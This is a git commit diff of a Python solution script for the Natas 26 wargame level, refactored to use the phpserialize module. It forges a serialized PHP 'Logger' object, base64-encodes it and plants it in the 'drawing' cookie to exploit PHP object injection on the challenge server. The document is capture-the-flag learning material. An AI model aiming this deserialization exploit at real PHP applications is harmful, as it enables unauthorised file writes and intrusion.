bbefaa9d96f27575b862a1ce43af72a6e7567a3e
Piotr Czajka <czajka@protonmail.com>
2018-01-20 23:05:13 +0100

    phpserialize module for php-like serializing

--- natas/natas26.py
+++ natas/natas26.py
@@ -1,31 +1,64 @@
-from natas import Natas
 import base64
 
-IMAGEPATH = 'natas26image.png'
+import phpserialize
+
+from natas import Natas
+
+
 PHPSESSID = 'asdf'
 
-logfile = 'img/natas26_{PHPSESSID}.png'.format(PHPSESSID=PHPSESSID)
-initmsg = ''
-exitmsg = ''
 
-fake_drawing = ''.join(('O:6:"Logger":3:{{s:13:"LoggerlogFile";s:{logfilelen}:"{logfile}"',
-                ';s:13:"LoggerinitMsg";s:{initmsglen}:"{initmsg}"',
-                ';s:13:"LoggerexitMsg";s:{exitmsglen}:"{exitmsg}";}}')).format(
-                        logfilelen=len(logfile),
-                        initmsglen=len(initmsg),
-                        exitmsglen=len(exitmsg),
-                        logfile=logfile,
-                        initmsg=initmsg,
-                        exitmsg=exitmsg
-                        )
+class Logger:
 
-fake_drawing = base64.encodebytes(fake_drawing.encode('ascii')).decode('ascii').replace('\n', '')
+    def __init__(self, filename):
+        self.init_msg = 'session started'
+        self.exit_msg = 'session end'
+        self.log_file = f'img/natas26_{PHPSESSID}.png'
 
-natas = Natas('natas26', keep_session=True, quiet=True)
+    @staticmethod
+    def serializer(obj):
+        serializable = phpserialize.phpobject(
+                'Logger',
+                {
+                    'LoggerinitMsg': obj.init_msg,
+                    'LoggerexitMsg': obj.exit_msg,
+                    'LoggerlogFile': obj.log_file,
+                    'Loggerx1': 3,
+                    'Loggerx2': 4,
+                    'Loggery1': 5,
+                    'Loggery2': 6,
+                }
+                )
 
-natas.set_cookie('PHPSESSID', PHPSESSID)
-natas.set_cookie('drawing', fake_drawing)
+        return serializable
 
-resp = natas.get_response()
 
-print(resp.text)
+logger = Logger('asdf')
+
+serialized = phpserialize.dumps([[logger]], object_hook=Logger.serializer)
+
+readable = serialized
+
+serialized = base64.encodebytes(serialized).decode('ascii')
+serialized = serialized.replace('\n', '')
+
+prep_natas = Natas('natas26', keep_session=True)
+real_natas = Natas('natas26', keep_session=True)
+
+real_resp = real_natas.get_response(get_data={
+    'x1': 5,
+    'x2': 6,
+    'y1': 3,
+    'y2': 4
+    })
+
+drawing = real_natas.get_cookies()['drawing']
+drawing = drawing.replace('%3D', '=')
+drawing = base64.decodebytes(drawing.encode()).decode()
+print(drawing)
+
+
+prep_natas.set_cookie('phpsessid', PHPSESSID)
+prep_natas.set_cookie('drawing', serialized)
+
+resp = prep_natas.get_response()
